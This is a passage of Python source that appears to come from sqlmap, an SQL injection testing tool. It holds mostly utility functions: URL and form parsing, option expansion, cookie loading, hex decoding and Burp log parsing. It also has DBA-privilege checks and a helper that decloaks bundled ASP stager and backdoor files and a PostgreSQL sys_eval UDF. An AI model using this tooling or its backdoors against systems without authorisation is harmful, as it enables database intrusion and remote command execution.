DBMS.MCKOI, DBMS.PRESTO, DBMS.CRATEDB, DBMS.CACHE, DBMS.EXTREMEDB, DBMS.FRONTBASE, DBMS.RAIMA, DBMS.VIRTUOSO):\n            retVal = name.replace(\"\\\"\", \"\")\n        elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.ALTIBASE, DBMS.MIMERSQL):\n            retVal = name.replace(\"\\\"\", \"\").upper()\n        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n            retVal = name.replace(\"[\", \"\").replace(\"]\", \"\")\n\n        if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n            retVal = re.sub(r\"(?i)\\A\\[?%s\\]?\\.\" % DEFAULT_MSSQL_SCHEMA, \"\", retVal)\n\n    return retVal\n\ndef isNoneValue(value):\n    \"\"\"\n    Returns whether the value is unusable (None or '')\n\n    >>> isNoneValue(None)\n    True\n    >>> isNoneValue('None')\n    True\n    >>> isNoneValue('')\n    True\n    >>> isNoneValue([])\n    True\n    >>> isNoneValue([2])\n    False\n    \"\"\"\n\n    if isinstance(value, six.string_types):\n        return value in (\"None\", \"\")\n    elif isListLike(value):\n        return all(isNoneValue(_) for _ in value)\n    elif isinstance(value, dict):\n        return not any(value)\n    else:\n        return value is None\n\ndef isNullValue(value):\n    \"\"\"\n    Returns whether the value contains explicit 'NULL' value\n\n    >>> isNullValue(u'NULL')\n    True\n    >>> isNullValue(u'foobar')\n    False\n    \"\"\"\n\n    return hasattr(value, \"upper\") and value.upper() == NULL\n\ndef expandMnemonics(mnemonics, parser, args):\n    \"\"\"\n    Expands mnemonic options\n    \"\"\"\n\n    class MnemonicNode(object):\n        def __init__(self):\n            self.next = {}\n            self.current = []\n\n    head = MnemonicNode()\n    pointer = None\n\n    for group in parser.option_groups:\n        for option in group.option_list:\n            for opt in option._long_opts + option._short_opts:\n                pointer = head\n\n                for char in opt:\n                    if char == \"-\":\n                        continue\n                    elif char not in pointer.next:\n                        pointer.next[char] = MnemonicNode()\n\n                    pointer = pointer.next[char]\n                    pointer.current.append(option)\n\n    for mnemonic in (mnemonics or \"\").split(','):\n        found = None\n        name = mnemonic.split('=')[0].replace('-', \"\").strip()\n        value = mnemonic.split('=')[1] if len(mnemonic.split('=')) > 1 else None\n        pointer = head\n\n        for char in name:\n            if char in pointer.next:\n                pointer = pointer.next[char]\n            else:\n                pointer = None\n                break\n\n        if pointer in (None, head):\n            errMsg = \"mnemonic '%s' can't be resolved to any parameter name\" % name\n            raise SqlmapSyntaxException(errMsg)\n\n        elif len(pointer.current) > 1:\n            options = {}\n\n            for option in pointer.current:\n                for opt in option._long_opts + option._short_opts:\n                    opt = opt.strip('-')\n                    if opt.startswith(name):\n                        options[opt] = option\n\n            if not options:\n                warnMsg = \"mnemonic '%s' can't be resolved\" % name\n                logger.warning(warnMsg)\n            elif name in options:\n                found = name\n                debugMsg = \"mnemonic '%s' resolved to %s). \" % (name, found)\n                logger.debug(debugMsg)\n            else:\n                found = sorted(options.keys(), key=len)[0]\n                warnMsg = \"detected ambiguity (mnemonic '%s' can be resolved to any of: %s). \" % (name, \", \".join(\"'%s'\" % key for key in options))\n                warnMsg += \"Resolved to shortest of those ('%s')\" % found\n                logger.warning(warnMsg)\n\n            if found:\n                found = options[found]\n        else:\n            found = pointer.current[0]\n            debugMsg = \"mnemonic '%s' resolved to %s). \" % (name, found)\n            logger.debug(debugMsg)\n\n        if found:\n            try:\n                value = found.convert_value(found, value)\n            except OptionValueError:\n                value = None\n\n            if value is not None:\n                setattr(args, found.dest, value)\n            elif not found.type:  # boolean\n                setattr(args, found.dest, True)\n            else:\n                errMsg = \"mnemonic '%s' requires value of type '%s'\" % (name, found.type)\n                raise SqlmapSyntaxException(errMsg)\n\ndef safeCSValue(value):\n    \"\"\"\n    Returns value safe for CSV dumping\n\n    # Reference: http://tools.ietf.org/html/rfc4180\n\n    >>> safeCSValue('foo, bar')\n    '\"foo, bar\"'\n    >>> safeCSValue('foobar')\n    'foobar'\n    \"\"\"\n\n    retVal = value\n\n    if retVal and isinstance(retVal, six.string_types):\n        if not (retVal[0] == retVal[-1] == '\"'):\n            if any(_ in retVal for _ in (conf.get(\"csvDel\", defaults.csvDel), '\"', '\\n')):\n                retVal = '\"%s\"' % retVal.replace('\"', '\"\"')\n\n    return retVal\n\ndef filterPairValues(values):\n    \"\"\"\n    Returns only list-like values with length 2\n\n    >>> filterPairValues([[1, 2], [3], 1, [4, 5]])\n    [[1, 2], [4, 5]]\n    \"\"\"\n\n    retVal = []\n\n    if not isNoneValue(values) and hasattr(values, '__iter__'):\n        retVal = [value for value in values if isinstance(value, (tuple, list, set)) and len(value) == 2]\n\n    return retVal\n\ndef randomizeParameterValue(value):\n    \"\"\"\n    Randomize a parameter value based on occurrences of alphanumeric characters\n\n    >>> random.seed(0)\n    >>> randomizeParameterValue('foobar')\n    'fupgpy'\n    >>> randomizeParameterValue('17')\n    '36'\n    \"\"\"\n\n    retVal = value\n\n    value = re.sub(r\"%[0-9a-fA-F]{2}\", \"\", value)\n\n    for match in re.finditer(r\"[A-Z]+\", value):\n        while True:\n            original = match.group()\n            candidate = randomStr(len(match.group())).upper()\n            if original != candidate:\n                break\n\n        retVal = retVal.replace(original, candidate)\n\n    for match in re.finditer(r\"[a-z]+\", value):\n        while True:\n            original = match.group()\n            candidate = randomStr(len(match.group())).lower()\n            if original != candidate:\n                break\n\n        retVal = retVal.replace(original, candidate)\n\n    for match in re.finditer(r\"[0-9]+\", value):\n        while True:\n            original = match.group()\n            candidate = str(randomInt(len(match.group())))\n            if original != candidate:\n                break\n\n        retVal = retVal.replace(original, candidate)\n\n    if re.match(r\"\\A[^@]+@.+\\.[a-z]+\\Z\", value):\n        parts = retVal.split('.')\n        parts[-1] = random.sample(RANDOMIZATION_TLDS, 1)[0]\n        retVal = '.'.join(parts)\n\n    if not retVal:\n        retVal = randomStr(lowercase=True)\n\n    return retVal\n\n@cachedmethod\ndef asciifyUrl(url, forceQuote=False):\n    \"\"\"\n    Attempts to make a unicode URL usable with ``urllib/urllib2``.\n\n    More specifically, it attempts to convert the unicode object ``url``,\n    which is meant to represent a IRI, to an unicode object that,\n    containing only ASCII characters, is a valid URI. This involves:\n\n        * IDNA/Puny-encoding the domain name.\n        * UTF8-quoting the path and querystring parts.\n\n    See also RFC 3987.\n\n    # Reference: http://blog.elsdoerfer.name/2008/12/12/opening-iris-in-python/\n\n    >>> asciifyUrl(u'http://www.\\\\u0161u\\\\u0107uraj.com')\n    'http://www.xn--uuraj-gxa24d.com'\n    \"\"\"\n\n    parts = _urllib.parse.urlsplit(url)\n    if not all((parts.scheme, parts.netloc, parts.hostname)):\n        # apparently not an url\n        return getText(url)\n\n    if all(char in string.printable for char in url):\n        return getText(url)\n\n    hostname = parts.hostname\n\n    if isinstance(hostname, six.binary_type):\n        hostname = getUnicode(hostname)\n\n    # idna-encode domain\n    try:\n        hostname = hostname.encode(\"idna\")\n    except:\n        hostname = hostname.encode(\"punycode\")\n\n    # UTF8-quote the other parts. We check each part individually if\n    # if needs to be quoted - that should catch some additional user\n    # errors, say for example an umlaut in the username even though\n    # the path *is* already quoted.\n    def quote(s, safe):\n        s = s or ''\n        # Triggers on non-ascii characters - another option would be:\n        #     _urllib.parse.quote(s.replace('%', '')) != s.replace('%', '')\n        # which would trigger on all %-characters, e.g. \"&\".\n        if getUnicode(s).encode(\"ascii\", \"replace\") != s or forceQuote:\n            s = _urllib.parse.quote(getBytes(s), safe=safe)\n        return s\n\n    username = quote(parts.username, '')\n    password = quote(parts.password, safe='')\n    path = quote(parts.path, safe='/')\n    query = quote(parts.query, safe=\"&=\")\n\n    # put everything back together\n    netloc = getText(hostname)\n    if username or password:\n        netloc = '@' + netloc\n        if password:\n            netloc = ':' + password + netloc\n        netloc = username + netloc\n\n    try:\n        port = parts.port\n    except:\n        port = None\n\n    if port:\n        netloc += ':' + str(port)\n\n    return getText(_urllib.parse.urlunsplit([parts.scheme, netloc, path, query, parts.fragment]) or url)\n\ndef isAdminFromPrivileges(privileges):\n    \"\"\"\n    Inspects privileges to see if those are coming from an admin user\n    \"\"\"\n\n    privileges = privileges or []\n\n    # In PostgreSQL the usesuper privilege means that the\n    # user is DBA\n    retVal = (Backend.isDbms(DBMS.PGSQL) and \"super\" in privileges)\n\n    # In Oracle the DBA privilege means that the\n    # user is DBA\n    retVal |= (Backend.isDbms(DBMS.ORACLE) and \"DBA\" in privileges)\n\n    # In MySQL >= 5.0 the SUPER privilege means\n    # that the user is DBA\n    retVal |= (Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema and \"SUPER\" in privileges)\n\n    # In MySQL < 5.0 the super_priv privilege means\n    # that the user is DBA\n    retVal |= (Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema and \"super_priv\" in privileges)\n\n    # In Firebird there is no specific privilege that means\n    # that the user is DBA\n    retVal |= (Backend.isDbms(DBMS.FIREBIRD) and all(_ in privileges for _ in (\"SELECT\", \"INSERT\", \"UPDATE\", \"DELETE\", \"REFERENCES\", \"EXECUTE\")))\n\n    return retVal\n\ndef findPageForms(content, url, raise_=False, addToTargets=False):\n    \"\"\"\n    Parses given page content for possible forms (Note: still not implemented for Python3)\n\n    >>> findPageForms('<html><form action=\"/input.php\" method=\"POST\"><input type=\"text\" name=\"id\" value=\"1\"><input type=\"submit\" value=\"Submit\"></form></html>', 'http://www.site.com') == set([('http://www.site.com/input.php', 'POST', 'id=1', None, None)])\n    True\n    \"\"\"\n\n    class _(six.StringIO, object):\n        def __init__(self, content, url):\n            super(_, self).__init__(content)\n            self._url = url\n\n        def geturl(self):\n            return self._url\n\n    if not content:\n        errMsg = \"can't parse forms as the page content appears to be blank\"\n        if raise_:\n            raise SqlmapGenericException(errMsg)\n        else:\n            logger.debug(errMsg)\n\n    forms = None\n    retVal = set()\n    response = _(content, url)\n\n    try:\n        forms = ParseResponse(response, backwards_compat=False)\n    except ParseError:\n        if re.search(r\"(?i)<!DOCTYPE html|<html\", content or \"\") and not re.search(r\"(?i)\\.js(\\?|\\Z)\", url):\n            dbgMsg = \"badly formed HTML at the given URL ('%s'). Going to filter it\" % url\n            logger.debug(dbgMsg)\n            filtered = _(\"\".join(re.findall(FORM_SEARCH_REGEX, content)), url)\n\n            if filtered and filtered != content:\n                try:\n                    forms = ParseResponse(filtered, backwards_compat=False)\n                except:\n                    errMsg = \"no success\"\n                    if raise_:\n                        raise SqlmapGenericException(errMsg)\n                    else:\n                        logger.debug(errMsg)\n    except:\n        pass\n\n    for form in forms or []:\n        try:\n            for control in form.controls:\n                if hasattr(control, \"items\") and not any((control.disabled, control.readonly)):\n                    # if control has selectable items select first non-disabled\n                    for item in control.items:\n                        if not item.disabled:\n                            if not item.selected:\n                                item.selected = True\n                            break\n\n            if conf.crawlExclude and re.search(conf.crawlExclude, form.action or \"\"):\n                dbgMsg = \"skipping '%s'\" % form.action\n                logger.debug(dbgMsg)\n                continue\n\n            request = form.click()\n        except (ValueError, TypeError) as ex:\n            errMsg = \"there has been a problem while \"\n            errMsg += \"processing page forms ('%s')\" % getSafeExString(ex)\n            if raise_:\n                raise SqlmapGenericException(errMsg)\n            else:\n                logger.debug(errMsg)\n        else:\n            url = urldecode(request.get_full_url(), kb.pageEncoding)\n            method = request.get_method()\n            data = unArrayizeValue(request.data)\n            data = urldecode(data, kb.pageEncoding, spaceplus=False)\n\n            if not data and method and method.upper() == HTTPMETHOD.POST:\n                debugMsg = \"invalid POST form with blank data detected\"\n                logger.debug(debugMsg)\n                continue\n\n            # flag to know if we are dealing with the same target host\n            _ = checkSameHost(response.geturl(), url)\n\n            if data:\n                data = data.lstrip(\"&=\").rstrip('&')\n\n            if conf.scope and not re.search(conf.scope, url, re.I):\n                continue\n            elif data and not re.sub(r\"(%s)=[^&]*&?\" % '|'.join(IGNORE_PARAMETERS), \"\", data):\n                continue\n            elif not _:\n                continue\n            else:\n                target = (url, method, data, conf.cookie, None)\n                retVal.add(target)\n\n    for match in re.finditer(r\"\\.post\\(['\\\"]([^'\\\"]*)['\\\"],\\s*\\{([^}]*)\\}\", content):\n        url = _urllib.parse.urljoin(url, htmlUnescape(match.group(1)))\n        data = \"\"\n\n        for name, value in re.findall(r\"['\\\"]?(\\w+)['\\\"]?\\s*:\\s*(['\\\"][^'\\\"]+)?\", match.group(2)):\n            data += \"%s=%s%s\" % (name, value, DEFAULT_GET_POST_DELIMITER)\n\n        data = data.rstrip(DEFAULT_GET_POST_DELIMITER)\n        retVal.add((url, HTTPMETHOD.POST, data, conf.cookie, None))\n\n    for match in re.finditer(r\"(?s)(\\w+)\\.open\\(['\\\"]POST['\\\"],\\s*['\\\"]([^'\\\"]+)['\\\"]\\).*?\\1\\.send\\(([^)]+)\\)\", content):\n        url = _urllib.parse.urljoin(url, htmlUnescape(match.group(2)))\n        data = match.group(3)\n\n        data = re.sub(r\"\\s*\\+\\s*[^\\s'\\\"]+|[^\\s'\\\"]+\\s*\\+\\s*\", \"\", data)\n\n        data = data.strip(\"['\\\"]\")\n        retVal.add((url, HTTPMETHOD.POST, data, conf.cookie, None))\n\n    if not retVal and not conf.crawlDepth:\n        errMsg = \"there were no forms found at the given target URL\"\n        if raise_:\n            raise SqlmapGenericException(errMsg)\n        else:\n            logger.debug(errMsg)\n\n    if addToTargets and retVal:\n        for target in retVal:\n            kb.targets.add(target)\n\n    return retVal\n\ndef checkSameHost(*urls):\n    \"\"\"\n    Returns True if all provided urls share that same host\n\n    >>> checkSameHost('http://www.target.com/page1.php?id=1', 'http://www.target.com/images/page2.php')\n    True\n    >>> checkSameHost('http://www.target.com/page1.php?id=1', 'http://www.target2.com/images/page2.php')\n    False\n    \"\"\"\n\n    if not urls:\n        return None\n    elif len(urls) == 1:\n        return True\n    else:\n        def _(value):\n            if value and not re.search(r\"\\A\\w+://\", value):\n                value = \"http://%s\" % value\n            return value\n\n        return all(re.sub(r\"(?i)\\Awww\\.\", \"\", _urllib.parse.urlparse(_(url) or \"\").netloc.split(':')[0]) == re.sub(r\"(?i)\\Awww\\.\", \"\", _urllib.parse.urlparse(_(urls[0]) or \"\").netloc.split(':')[0]) for url in urls[1:])\n\ndef getHostHeader(url):\n    \"\"\"\n    Returns proper Host header value for a given target URL\n\n    >>> getHostHeader('http://www.target.com/vuln.php?id=1')\n    'www.target.com'\n    \"\"\"\n\n    retVal = url\n\n    if url:\n        retVal = _urllib.parse.urlparse(url).netloc\n\n        if re.search(r\"http(s)?://\\[.+\\]\", url, re.I):\n            retVal = extractRegexResult(r\"http(s)?://\\[(?P<result>.+)\\]\", url)\n        elif any(retVal.endswith(':%d' % _) for _ in (80, 443)):\n            retVal = retVal.split(':')[0]\n\n    if retVal and retVal.count(':') > 1 and not any(_ in retVal for _ in ('[', ']')):\n        retVal = \"[%s]\" % retVal\n\n    return retVal\n\ndef checkOldOptions(args):\n    \"\"\"\n    Checks for obsolete/deprecated options\n    \"\"\"\n\n    for _ in args:\n        _ = _.split('=')[0].strip()\n        if _ in OBSOLETE_OPTIONS:\n            errMsg = \"switch/option '%s' is obsolete\" % _\n            if OBSOLETE_OPTIONS[_]:\n                errMsg += \" (hint: %s)\" % OBSOLETE_OPTIONS[_]\n            raise SqlmapSyntaxException(errMsg)\n        elif _ in DEPRECATED_OPTIONS:\n            warnMsg = \"switch/option '%s' is deprecated\" % _\n            if DEPRECATED_OPTIONS[_]:\n                warnMsg += \" (hint: %s)\" % DEPRECATED_OPTIONS[_]\n            logger.warning(warnMsg)\n\ndef checkSystemEncoding():\n    \"\"\"\n    Checks for problematic encodings\n    \"\"\"\n\n    if sys.getdefaultencoding() == \"cp720\":\n        try:\n            codecs.lookup(\"cp720\")\n        except LookupError:\n            errMsg = \"there is a known Python issue (#1616979) related \"\n            errMsg += \"to support for charset 'cp720'. Please visit \"\n            errMsg += \"'http://blog.oneortheother.info/tip/python-fix-cp720-encoding/index.html' \"\n            errMsg += \"and follow the instructions to be able to fix it\"\n            logger.critical(errMsg)\n\n            warnMsg = \"temporary switching to charset 'cp1256'\"\n            logger.warning(warnMsg)\n\n            _reload_module(sys)\n            sys.setdefaultencoding(\"cp1256\")\n\ndef evaluateCode(code, variables=None):\n    \"\"\"\n    Executes given python code given in a string form\n\n    >>> _ = {}; evaluateCode(\"a = 1; b = 2; c = a\", _); _[\"c\"]\n    1\n    \"\"\"\n\n    try:\n        exec(code, variables)\n    except KeyboardInterrupt:\n        raise\n    except Exception as ex:\n        errMsg = \"an error occurred while evaluating provided code ('%s') \" % getSafeExString(ex)\n        raise SqlmapGenericException(errMsg)\n\ndef serializeObject(object_):\n    \"\"\"\n    Serializes given object\n\n    >>> type(serializeObject([1, 2, 3, ('a', 'b')])) == str\n    True\n    \"\"\"\n\n    return base64pickle(object_)\n\ndef unserializeObject(value):\n    \"\"\"\n    Unserializes object from given serialized form\n\n    >>> unserializeObject(serializeObject([1, 2, 3])) == [1, 2, 3]\n    True\n    >>> unserializeObject('gAJVBmZvb2JhcnEBLg==')\n    'foobar'\n    \"\"\"\n\n    return base64unpickle(value) if value else None\n\ndef resetCounter(technique):\n    \"\"\"\n    Resets query counter for a given technique\n    \"\"\"\n\n    kb.counters[technique] = 0\n\ndef incrementCounter(technique):\n    \"\"\"\n    Increments query counter for a given technique\n    \"\"\"\n\n    kb.counters[technique] = getCounter(technique) + 1\n\ndef getCounter(technique):\n    \"\"\"\n    Returns query counter for a given technique\n\n    >>> resetCounter(PAYLOAD.TECHNIQUE.STACKED); incrementCounter(PAYLOAD.TECHNIQUE.STACKED); getCounter(PAYLOAD.TECHNIQUE.STACKED)\n    1\n    \"\"\"\n\n    return kb.counters.get(technique, 0)\n\ndef applyFunctionRecursively(value, function):\n    \"\"\"\n    Applies function recursively through list-like structures\n\n    >>> applyFunctionRecursively([1, 2, [3, 4, [19]], -9], lambda _: _ > 0)\n    [True, True, [True, True, [True]], False]\n    \"\"\"\n\n    if isListLike(value):\n        retVal = [applyFunctionRecursively(_, function) for _ in value]\n    else:\n        retVal = function(value)\n\n    return retVal\n\ndef decodeDbmsHexValue(value, raw=False):\n    \"\"\"\n    Returns value decoded from DBMS specific hexadecimal representation\n\n    >>> decodeDbmsHexValue('3132332031') == u'123 1'\n    True\n    >>> decodeDbmsHexValue('31003200330020003100') == u'123 1'\n    True\n    >>> decodeDbmsHexValue('00310032003300200031') == u'123 1'\n    True\n    >>> decodeDbmsHexValue('0x31003200330020003100') == u'123 1'\n    True\n    >>> decodeDbmsHexValue('313233203') == u'123 ?'\n    True\n    >>> decodeDbmsHexValue(['0x31', '0x32']) == [u'1', u'2']\n    True\n    >>> decodeDbmsHexValue('5.1.41') == u'5.1.41'\n    True\n    \"\"\"\n\n    retVal = value\n\n    def _(value):\n        retVal = value\n        if value and isinstance(value, six.string_types):\n            value = value.strip()\n\n            if len(value) % 2 != 0:\n                retVal = (decodeHex(value[:-1]) + b'?') if len(value) > 1 else value\n                singleTimeWarnMessage(\"there was a problem decoding value '%s' from expected hexadecimal form\" % value)\n            else:\n                retVal = decodeHex(value)\n\n            if not raw:\n                if not kb.binaryField:\n                    if Backend.isDbms(DBMS.MSSQL) and value.startswith(\"0x\"):\n                        try:\n                            retVal = retVal.decode(\"utf-16-le\")\n                        except UnicodeDecodeError:\n                            pass\n\n                    elif Backend.getIdentifiedDbms() in (DBMS.HSQLDB, DBMS.H2):\n                        try:\n                            retVal = retVal.decode(\"utf-16-be\")\n                        except UnicodeDecodeError:\n                            pass\n\n                if not isinstance(retVal, six.text_type):\n                    retVal = getUnicode(retVal, conf.encoding or UNICODE_ENCODING)\n\n                if u\"\\x00\" in retVal:\n                    retVal = retVal.replace(u\"\\x00\", u\"\")\n\n        return retVal\n\n    try:\n        retVal = applyFunctionRecursively(value, _)\n    except:\n        singleTimeWarnMessage(\"there was a problem decoding value '%s' from expected hexadecimal form\" % value)\n\n    return retVal\n\ndef extractExpectedValue(value, expected):\n    \"\"\"\n    Extracts and returns expected value by a given type\n\n    >>> extractExpectedValue(['1'], EXPECTED.BOOL)\n    True\n    >>> extractExpectedValue('1', EXPECTED.INT)\n    1\n    >>> extractExpectedValue('7\\\\xb9645', EXPECTED.INT) is None\n    True\n    \"\"\"\n\n    if expected:\n        value = unArrayizeValue(value)\n\n        if isNoneValue(value):\n            value = None\n        elif expected == EXPECTED.BOOL:\n            if isinstance(value, int):\n                value = bool(value)\n            elif isinstance(value, six.string_types):\n                value = value.strip().lower()\n                if value in (\"true\", \"false\"):\n                    value = value == \"true\"\n                elif value in ('t', 'f'):\n                    value = value == 't'\n                elif value in (\"1\", \"-1\"):\n                    value = True\n                elif value == '0':\n                    value = False\n                else:\n                    value = None\n        elif expected == EXPECTED.INT:\n            try:\n                value = int(value)\n            except:\n                value = None\n\n    return value\n\ndef hashDBWrite(key, value, serialize=False):\n    \"\"\"\n    Helper function for writing session data to HashDB\n    \"\"\"\n\n    if conf.hashDB:\n        _ = '|'.join((str(_) if not isinstance(_, six.string_types) else _) for _ in (conf.hostname, conf.path.strip('/') if conf.path is not None else conf.port, key, HASHDB_MILESTONE_VALUE))\n        conf.hashDB.write(_, value, serialize)\n\ndef hashDBRetrieve(key, unserialize=False, checkConf=False):\n    \"\"\"\n    Helper function for restoring session data from HashDB\n    \"\"\"\n\n    retVal = None\n\n    if conf.hashDB:\n        _ = '|'.join((str(_) if not isinstance(_, six.string_types) else _) for _ in (conf.hostname, conf.path.strip('/') if conf.path is not None else conf.port, key, HASHDB_MILESTONE_VALUE))\n        retVal = conf.hashDB.retrieve(_, unserialize) if kb.resumeValues and not (checkConf and any((conf.flushSession, conf.freshQueries))) else None\n\n        if not kb.inferenceMode and not kb.fileReadMode and isinstance(retVal, six.string_types) and any(_ in retVal for _ in (PARTIAL_VALUE_MARKER, PARTIAL_HEX_VALUE_MARKER)):\n            retVal = None\n\n    return retVal\n\ndef resetCookieJar(cookieJar):\n    \"\"\"\n    Cleans cookies from a given cookie jar\n    \"\"\"\n\n    if not conf.loadCookies:\n        cookieJar.clear()\n    else:\n        try:\n            if not cookieJar.filename:\n                infoMsg = \"loading cookies from '%s'\" % conf.loadCookies\n                logger.info(infoMsg)\n\n                content = readCachedFileContent(conf.loadCookies)\n                content = re.sub(\"(?im)^#httpOnly_\", \"\", content)\n                lines = filterNone(line.strip() for line in content.split(\"\\n\") if not line.startswith('#'))\n                handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.COOKIE_JAR)\n                os.close(handle)\n\n                # Reference: http://www.hashbangcode.com/blog/netscape-http-cooke-file-parser-php-584.html\n                with openFile(filename, \"w+b\") as f:\n                    f.write(\"%s\\n\" % NETSCAPE_FORMAT_HEADER_COOKIES)\n                    for line in lines:\n                        _ = line.split(\"\\t\")\n                        if len(_) == 7:\n                            _[4] = FORCE_COOKIE_EXPIRATION_TIME\n                            f.write(\"\\n%s\" % \"\\t\".join(_))\n\n                cookieJar.filename = filename\n\n            cookieJar.load(cookieJar.filename, ignore_expires=True)\n\n            for cookie in cookieJar:\n                if getattr(cookie, \"expires\", MAX_INT) < time.time():\n                    warnMsg = \"cookie '%s' has expired\" % cookie\n                    singleTimeWarnMessage(warnMsg)\n\n            cookieJar.clear_expired_cookies()\n\n            if not cookieJar._cookies:\n                errMsg = \"no valid cookies found\"\n                raise SqlmapGenericException(errMsg)\n\n        except Exception as ex:\n            errMsg = \"there was a problem loading \"\n            errMsg += \"cookies file ('%s')\" % re.sub(r\"(cookies) file '[^']+'\", r\"\\g<1>\", getSafeExString(ex))\n            raise SqlmapGenericException(errMsg)\n\ndef decloakToTemp(filename):\n    \"\"\"\n    Decloaks content of a given file to a temporary file with similar name and extension\n\n    NOTE: using in-memory decloak() in docTests because of the \"problem\" on Windows platform\n\n    >>> decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"stagers\", \"stager.asp_\")).startswith(b'<%')\n    True\n    >>> decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"backdoors\", \"backdoor.asp_\")).startswith(b'<%')\n    True\n    >>> b'sys_eval' in decloak(os.path.join(paths.SQLMAP_UDF_PATH, \"postgresql\", \"linux\", \"64\", \"11\", \"lib_postgresqludf_sys.so_\"))\n    True\n    \"\"\"\n\n    content = decloak(filename)\n\n    parts = os.path.split(filename[:-1])[-1].split('.')\n    prefix, suffix = parts[0], '.' + parts[-1]\n    handle, filename = tempfile.mkstemp(prefix=prefix, suffix=suffix)\n    os.close(handle)\n\n    with openFile(filename, \"w+b\", encoding=None) as f:\n        f.write(content)\n\n    return filename\n\ndef prioritySortColumns(columns):\n    \"\"\"\n    Sorts given column names by length in ascending order while those containing\n    string 'id' go first\n\n    >>> prioritySortColumns(['password', 'userid', 'name'])\n    ['userid', 'name', 'password']\n    \"\"\"\n\n    def _(column):\n        return column and re.search(r\"^id|id$\", column, re.I) is not None\n\n    return sorted(sorted(columns, key=len), key=functools.cmp_to_key(lambda x, y: -1 if _(x) and not _(y) else 1 if not _(x) and _(y) else 0))\n\ndef getRequestHeader(request, name):\n    \"\"\"\n    Solving an issue with an urllib2 Request header case sensitivity\n\n    # Reference: http://bugs.python.org/issue2275\n\n    >>> _ = lambda _: _\n    >>> _.headers = {\"FOO\": \"BAR\"}\n    >>> _.header_items = lambda: _.headers.items()\n    >>> getText(getRequestHeader(_, \"foo\"))\n    'BAR'\n    \"\"\"\n\n    retVal = None\n\n    if request and request.headers and name:\n        _ = name.upper()\n        retVal = max(getBytes(value if _ == key.upper() else \"\") for key, value in request.header_items()) or None\n\n    return retVal\n\ndef isNumber(value):\n    \"\"\"\n    Returns True if the given value is a number-like object\n\n    >>> isNumber(1)\n    True\n    >>> isNumber('0')\n    True\n    >>> isNumber('foobar')\n    False\n    \"\"\"\n\n    try:\n        float(value)\n    except:\n        return False\n    else:\n        return True\n\ndef zeroDepthSearch(expression, value):\n    \"\"\"\n    Searches occurrences of value inside expression at 0-depth level\n    regarding the parentheses\n\n    >>> _ = \"SELECT (SELECT id FROM users WHERE 2>1) AS result FROM DUAL\"; _[zeroDepthSearch(_, \"FROM\")[0]:]\n    'FROM DUAL'\n    >>> _ = \"a(b; c),d;e\"; _[zeroDepthSearch(_, \"[;, ]\")[0]:]\n    ',d;e'\n    \"\"\"\n\n    retVal = []\n\n    depth = 0\n    for index in xrange(len(expression)):\n        if expression[index] == '(':\n            depth += 1\n        elif expression[index] == ')':\n            depth -= 1\n        elif depth == 0:\n            if value.startswith('[') and value.endswith(']'):\n                if re.search(value, expression[index:index + 1]):\n                    retVal.append(index)\n            elif expression[index:index + len(value)] == value:\n                retVal.append(index)\n\n    return retVal\n\ndef splitFields(fields, delimiter=','):\n    \"\"\"\n    Returns list of (0-depth) fields splitted by delimiter\n\n    >>> splitFields('foo, bar, max(foo, bar)')\n    ['foo', 'bar', 'max(foo,bar)']\n    \"\"\"\n\n    fields = fields.replace(\"%s \" % delimiter, delimiter)\n    commas = [-1, len(fields)]\n    commas.extend(zeroDepthSearch(fields, ','))\n    commas = sorted(commas)\n\n    return [fields[x + 1:y] for (x, y) in _zip(commas, commas[1:])]\n\ndef pollProcess(process, suppress_errors=False):\n    \"\"\"\n    Checks for process status (prints . if still running)\n    \"\"\"\n\n    while process:\n        dataToStdout(\".\")\n        time.sleep(1)\n\n        returncode = process.poll()\n\n        if returncode is not None:\n            if not suppress_errors:\n                if returncode == 0:\n                    dataToStdout(\" done\\n\")\n                elif returncode < 0:\n                    dataToStdout(\" process terminated by signal %d\\n\" % returncode)\n                elif returncode > 0:\n                    dataToStdout(\" quit unexpectedly with return code %d\\n\" % returncode)\n\n            break\n\ndef parseRequestFile(reqFile, checkParams=True):\n    \"\"\"\n    Parses WebScarab and Burp logs and adds results to the target URL list\n\n    >>> handle, reqFile = tempfile.mkstemp(suffix=\".req\")\n    >>> content = b\"POST / HTTP/1.0\\\\nUser-agent: foobar\\\\nHost: www.example.com\\\\n\\\\nid=1\\\\n\"\n    >>> _ = os.write(handle, content)\n    >>> os.close(handle)\n    >>> next(parseRequestFile(reqFile)) == ('http://www.example.com:80/', 'POST', 'id=1', None, (('User-agent', 'foobar'), ('Host', 'www.example.com')))\n    True\n    \"\"\"\n\n    def _parseWebScarabLog(content):\n        \"\"\"\n        Parses WebScarab logs (POST method not supported)\n        \"\"\"\n\n        reqResList = content.split(WEBSCARAB_SPLITTER)\n\n        for request in reqResList:\n            url = extractRegexResult(r\"URL: (?P<result>.+?)\\n\", request, re.I)\n            method = extractRegexResult(r\"METHOD: (?P<result>.+?)\\n\", request, re.I)\n            cookie = extractRegexResult(r\"COOKIE: (?P<result>.+?)\\n\", request, re.I)\n\n            if not method or not url:\n                logger.debug(\"not a valid WebScarab log data\")\n                continue\n\n            if method.upper() == HTTPMETHOD.POST:\n                warnMsg = \"POST requests from WebScarab logs aren't supported \"\n                warnMsg += \"as their body content is stored in separate files. \"\n                warnMsg += \"Nevertheless you can use -r to load them individually.\"\n                logger.warning(warnMsg)\n                continue\n\n            if not(conf.scope and not re.search(conf.scope, url, re.I)):\n                yield (url, method, None, cookie, tuple())\n\n    def _parseBurpLog(content):\n        \"\"\"\n        Parses Burp logs\n        \"\"\"\n\n        if not re.search(BURP_REQUEST_REGEX, content, re.I | re.S):\n            if re.search(BURP_XML_HISTORY_REGEX, content, re.I | re.S):\n                reqResList = []\n                for match in re.finditer(BURP_XML_HISTORY_REGEX, content, re.I | re.S):\n                    port, request = match.groups()\n                    try:\n                        request = decodeBase64(request, binary=False)\n                    except (binascii.Error, TypeError):\n                        continue\n                    _ = re.search(r\"%s:.+\" % re.escape(HTTP_HEADER.HOST), request)\n                    if _:\n                        host = _.group(0).strip()\n                        if not re.search(r\":\\d+\\Z\", host):\n                            request = request.replace(host, 